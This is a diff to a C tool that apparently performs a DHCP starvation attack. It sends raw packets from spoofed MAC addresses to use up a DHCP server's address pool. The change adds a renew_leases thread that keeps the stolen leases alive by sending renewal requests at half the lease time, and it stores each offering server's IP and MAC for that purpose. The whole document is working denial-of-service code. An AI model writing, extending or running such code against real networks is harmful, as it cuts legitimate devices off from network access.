@@ -20,18 +20,11 @@
 #include <sys/select.h>
 #include <sys/time.h>
 #include <time.h>
+#include <pthread.h>
 
 #define BUFFER_SIZE 65535
 #define MAX_LINE_LEN 2048
-#define TIMEOUT 20
-
-volatile sig_atomic_t keep_running = 1;
-// for testing
-int num_of_loops = 0;
-struct sockaddr_ll addr = {0};
-socklen_t addr_len;
-uint8_t dhcp_host[4];
-int sock;
+#define TIMEOUT 10
 
 // DHCP header structure
 typedef struct DHCP
@@ -99,6 +92,9 @@ typedef struct Exausted
     uint8_t ip[4];
     uint8_t mac[16];
     uint32_t lease_time;
+    time_t timestamp_inserted;
+    uint8_t dhcp_host[4];
+    uint8_t dhcp_mac[6];
     struct Exausted *next;
 } Exausted;
 
@@ -108,6 +104,16 @@ typedef struct Targets
     uint8_t mac[6];
     struct Targets *next;
 } Targets;
+
+volatile sig_atomic_t keep_running = 1;
+// for testing
+int num_of_loops = 0;
+struct sockaddr_ll addr = {0};
+socklen_t addr_len;
+uint8_t dhcp_host[4];
+int sock;
+Exausted *head = NULL;
+int ifindex = 0;
 
 void print_usage(const char *progname);
 void spoof_mac(uint8_t *mac);
@@ -120,6 +126,8 @@ void cleanup(Packet *p, Exausted *head);
 void release_target(FILE *fp, Packet *p, uint8_t iface_ip, int ifindex);
 void release_on_exit(Packet *p, Exausted *head, int ifindex);
 int wait_for_response(unsigned char *buffer, uint8_t *transaction_id, int timout);
+Packet *init_packet(void);
+void *renew_leases(void *arg);
 
 int main(int argc, char *argv[])
 {
@@ -129,7 +137,6 @@ int main(int argc, char *argv[])
     int opt;
     int delay = 0;
     FILE *fp = NULL;
-    Exausted *head = NULL;
     const char *hostname = "pwn3d-poolshark";
     int mode = 0;
 
@@ -182,7 +189,7 @@ int main(int argc, char *argv[])
         mode = 1;
     }
 
-    Packet *p = malloc(sizeof(Packet));
+    Packet *p = init_packet();
 
     struct ifreq ifr;
     sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
@@ -201,64 +208,10 @@ int main(int argc, char *argv[])
 
     srand(time(NULL));
 
-    // init Ethernet header
-    spoof_mac(p->eth.src_mac);
-    memset(p->eth.dst_mac, 0xff, sizeof(p->eth.dst_mac));
-    p->eth.eth_type = htons(0x0800);
-
-    // init IP header
-    // version 4 header length 5
-    p->ip.version_ihl = 0x45;
-    p->ip.tos = 0;
-    // IP + UDP + DHCP headers
-    p->ip.total_len = htons(20 + 8 + 552);
-    p->ip.id = htons(0);
-    // don't fragment, no offset
-    p->ip.flags_offset = htons(0x4000);
-    p->ip.ttl = 64;
-    // protocol will be UDP
-    p->ip.proto = 17;
-    // will be calculated once the entire packet is built
-    p->ip.checksum = 0;
-    memset(p->ip.src_ip, 0x00, sizeof(p->ip.src_ip));
-    memset(p->ip.dst_ip, 0xff, sizeof(p->ip.dst_ip));
-
-    // init udp header
-    p->udp.src_port = htons(68);
-    p->udp.dst_port = htons(67);
-    p->udp.len = htons(8 + 552);
-    p->udp.checksum = 0;
-
-    // init dhcp header
-    p->dhcp.opcode = 1;
-    p->dhcp.hw_type = 1;
-    p->dhcp.hw_len = 6;
-    p->dhcp.hops = 0;
-    rand_transaction_id(p->dhcp.transaction_id);
-    memset(p->dhcp.sec_elapsed, 0x00, sizeof(p->dhcp.sec_elapsed));
-    memset(p->dhcp.flags, 0x00, sizeof(p->dhcp.flags));
-    memset(p->dhcp.client_ip, 0x00, sizeof(p->dhcp.client_ip));
-    memset(p->dhcp.server_ip, 0x00, sizeof(p->dhcp.server_ip));
-    memset(p->dhcp.gtwy_ip, 0x00, sizeof(p->dhcp.gtwy_ip));
-    memcpy(p->dhcp.client_mac, p->eth.src_mac, sizeof(p->eth.src_mac));
-    memset(p->dhcp.server_name, 0x00, sizeof(p->dhcp.server_name));
-    memset(p->dhcp.boot_file, 0x00, sizeof(p->dhcp.boot_file));
-    memset(p->dhcp.ip_addr, 0x00, sizeof(p->dhcp.ip_addr));
-    p->dhcp.magic_cookie[0] = 99;
-    p->dhcp.magic_cookie[1] = 130;
-    p->dhcp.magic_cookie[2] = 83;
-    p->dhcp.magic_cookie[3] = 99;
-    p->dhcp.options[0] = 53;
-    p->dhcp.options[1] = 1;
-    p->dhcp.options[2] = 1;
-    p->dhcp.options[3] = 255;
-    memset(&p->dhcp.options[4], 0x00, 308);
-    calc_ip_checksum(p);
-
     struct sockaddr_in *iaddr = (struct sockaddr_in *)&ifr.ifr_netmask;
     memcpy(ifr.ifr_name, iface, sizeof(iface));
 
-    int ifindex = if_nametoindex(ifr.ifr_name);
+    ifindex = if_nametoindex(ifr.ifr_name);
 
     if (ifindex < 0)
     {
@@ -306,10 +259,20 @@ int main(int argc, char *argv[])
         num_of_loops = num_of_ips;
     }
     
+    pthread_t thread;
+    int thread_id = 1;
+
     if(keep_running)
     {
+
+        if(pthread_create(&thread, NULL, renew_leases, &thread_id) != 0)
+        {
+            perror("pthread_create");
+            return 1;
+        }
         exaust_pool(ifindex, p, &head, num_of_ips, 0, hostname);
     }
+    pthread_join(thread, NULL);
     release_on_exit(p, head, ifindex);
     cleanup(p, head);
 }
@@ -493,7 +456,10 @@ void exaust_pool(int ifindex, Packet *p, Exausted **head, int num, int delay, co
 
         memcpy(&new_node->ip, &offer->dhcp.ip_addr, sizeof(offer->dhcp.ip_addr));
         memcpy(&new_node->mac, &p->eth.src_mac, sizeof(p->eth.src_mac));
-        new_node->lease_time = 7200;
+        memcpy(&new_node->dhcp_host, &offer->ip.src_ip, sizeof(offer->ip.src_ip));
+        memcpy(&new_node->dhcp_mac, &offer->eth.src_mac, sizeof(offer->eth.src_mac));
+        new_node->timestamp_inserted = time(NULL);
+        new_node->lease_time = 3600;
         new_node->next = *head;
         *head = new_node;
     }
@@ -722,7 +688,6 @@ void release_on_exit(Packet *p, Exausted *head, int ifindex)
     send_addr.sll_family = AF_PACKET;
     send_addr.sll_ifindex = ifindex;
     send_addr.sll_halen = 6;
-    memset(send_addr.sll_addr, 0xff, 6);
 
     int offset = 0;
 
@@ -733,10 +698,11 @@ void release_on_exit(Packet *p, Exausted *head, int ifindex)
         memcpy(&p->dhcp.client_mac, &current->mac, sizeof(current->mac));
         memcpy(&p->dhcp.client_ip, &current->ip, sizeof(current->ip));
 
-        memcpy(p->ip.dst_ip, dhcp_host, 4);
-        memcpy(p->ip.src_ip, current->ip, 4);
+        memcpy(&p->ip.dst_ip, &current->dhcp_host, sizeof(current->dhcp_host));
+        memcpy(&p->ip.src_ip, &current->ip, 4);
         // clear dhcp options.
         memset(p->dhcp.options, 0, sizeof(p->dhcp.options));
+        memcpy(&send_addr.sll_addr, &current->dhcp_mac, sizeof(current->dhcp_mac));
 
         offset = 0;
 
@@ -748,7 +714,7 @@ void release_on_exit(Packet *p, Exausted *head, int ifindex)
         // dhcp server identifier [54][4][ipaddr_bytes]
         p->dhcp.options[offset++] = 54;
         p->dhcp.options[offset++] = 4;
-        memcpy(&p->dhcp.options[offset], &dhcp_host, 4);
+        memcpy(&p->dhcp.options[offset], &current->dhcp_host, 4);
         offset += 4;
 
         // end of dhcp options.
@@ -812,4 +778,159 @@ int wait_for_response(unsigned char *buffer, uint8_t *transaction_id, int timeou
             return 1;
         }
     }
+}
+
+Packet *init_packet(void)
+{
+    Packet *p = malloc(sizeof(Packet));
+    if(!p)
+    {
+        perror("malloc");
+        exit(EXIT_FAILURE);
+    }
+
+    // init Ethernet header
+    spoof_mac(p->eth.src_mac);
+    memset(p->eth.dst_mac, 0xff, sizeof(p->eth.dst_mac));
+    p->eth.eth_type = htons(0x0800);
+
+    // init IP header
+    // version 4 header length 5
+    p->ip.version_ihl = 0x45;
+    p->ip.tos = 0;
+    // IP + UDP + DHCP headers
+    p->ip.total_len = htons(20 + 8 + 552);
+    p->ip.id = htons(0);
+    // don't fragment, no offset
+    p->ip.flags_offset = htons(0x4000);
+    p->ip.ttl = 64;
+    // protocol will be UDP
+    p->ip.proto = 17;
+    // will be calculated once the entire packet is built
+    p->ip.checksum = 0;
+    memset(p->ip.src_ip, 0x00, sizeof(p->ip.src_ip));
+    memset(p->ip.dst_ip, 0xff, sizeof(p->ip.dst_ip));
+
+    // init udp header
+    p->udp.src_port = htons(68);
+    p->udp.dst_port = htons(67);
+    p->udp.len = htons(8 + 552);
+    p->udp.checksum = 0;
+
+    // init dhcp header
+    p->dhcp.opcode = 1;
+    p->dhcp.hw_type = 1;
+    p->dhcp.hw_len = 6;
+    p->dhcp.hops = 0;
+    rand_transaction_id(p->dhcp.transaction_id);
+    memset(p->dhcp.sec_elapsed, 0x00, sizeof(p->dhcp.sec_elapsed));
+    memset(p->dhcp.flags, 0x00, sizeof(p->dhcp.flags));
+    memset(p->dhcp.client_ip, 0x00, sizeof(p->dhcp.client_ip));
+    memset(p->dhcp.server_ip, 0x00, sizeof(p->dhcp.server_ip));
+    memset(p->dhcp.gtwy_ip, 0x00, sizeof(p->dhcp.gtwy_ip));
+    memcpy(p->dhcp.client_mac, p->eth.src_mac, sizeof(p->eth.src_mac));
+    memset(p->dhcp.server_name, 0x00, sizeof(p->dhcp.server_name));
+    memset(p->dhcp.boot_file, 0x00, sizeof(p->dhcp.boot_file));
+    memset(p->dhcp.ip_addr, 0x00, sizeof(p->dhcp.ip_addr));
+    p->dhcp.magic_cookie[0] = 99;
+    p->dhcp.magic_cookie[1] = 130;
+    p->dhcp.magic_cookie[2] = 83;
+    p->dhcp.magic_cookie[3] = 99;
+    p->dhcp.options[0] = 53;
+    p->dhcp.options[1] = 1;
+    p->dhcp.options[2] = 1;
+    p->dhcp.options[3] = 255;
+    memset(&p->dhcp.options[4], 0x00, 308);
+    calc_ip_checksum(p);
+
+    return p;
+}
+
+void *renew_leases(void *arg)
+{
+    Packet *p = init_packet();
+    char ip_str[INET_ADDRSTRLEN];
+    unsigned char buffer[BUFFER_SIZE];
+    
+    while(keep_running)
+    {
+        Exausted *current = head;
+        rand_transaction_id(p->dhcp.transaction_id);
+
+        while(current != NULL && keep_running)
+        {
+            memcpy(&p->dhcp.client_mac, &current->mac, sizeof(current->mac));
+            memcpy(&p->dhcp.client_ip, &current->ip, sizeof(current->ip));
+
+            memcpy(p->ip.dst_ip, current->dhcp_host, 4);
+            memcpy(p->ip.src_ip, current->ip, 4);
+            memcpy(p->eth.dst_mac, current->dhcp_mac, sizeof(current->dhcp_mac));
+            // clear dhcp options.
+            memset(p->dhcp.options, 0, sizeof(p->dhcp.options));
+            inet_ntop(AF_INET, current->ip, ip_str, INET_ADDRSTRLEN);
+
+            int offset = 0;
+            // clear DHCP options
+
+            time_t time_now = time(NULL);
+            int half_lease = (current->lease_time / 2);
+            int elapsed = (int)difftime(time_now, current->timestamp_inserted);
+
+            printf("[THREAD_RENEWAL] %s elapsed time %d, total lease time: %d\n", ip_str, elapsed, current->lease_time);
+            sleep(3);
+
+            if(elapsed < half_lease)
+            {
+                current = current->next;
+                continue;
+            }
+
+            printf("Lease for %s expires soon, renewing lease...\n", ip_str);
+
+            p->dhcp.opcode = 1;
+
+            p->dhcp.options[offset++] = 53;
+            p->dhcp.options[offset++] = 1;
+            p->dhcp.options[offset++] = 3;
+
+            p->dhcp.options[offset++] = 50;
+            p->dhcp.options[offset++] = 4;
+            memcpy(&p->dhcp.options[offset], &current->ip, sizeof(current->ip));
+            offset += 4;
+
+            p->dhcp.options[offset++] = 54;
+            p->dhcp.options[offset++] = 4;
+            memcpy(&p->dhcp.options[offset], &current->dhcp_host, 4);
+            offset += 4;
+
+            p->dhcp.options[offset++] = 255;
+
+            calc_ip_checksum(p);
+
+            struct sockaddr_ll send_addr = {0};
+            send_addr.sll_family = AF_PACKET;
+            send_addr.sll_ifindex = ifindex;
+            send_addr.sll_halen = 6;
+            memcpy(send_addr.sll_addr, current->dhcp_mac, sizeof(current->dhcp_mac));
+
+            int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&send_addr, sizeof(send_addr));
+
+            if(bytes_sent < 0)
+            {
+                perror("sendto");
+                exit(EXIT_FAILURE);
+            }
+
+            if(wait_for_response(buffer, p->dhcp.transaction_id, TIMEOUT) != 1)
+            {
+                printf("No reponse from host while trying to renew %s, will try again on next iteration...\n", ip_str);
+                current = current->next;
+                continue;
+            }
+
+            printf("Renewed %s succesfully", ip_str);
+            current = current->next;
+        }
+    }
+    free(p);
 }
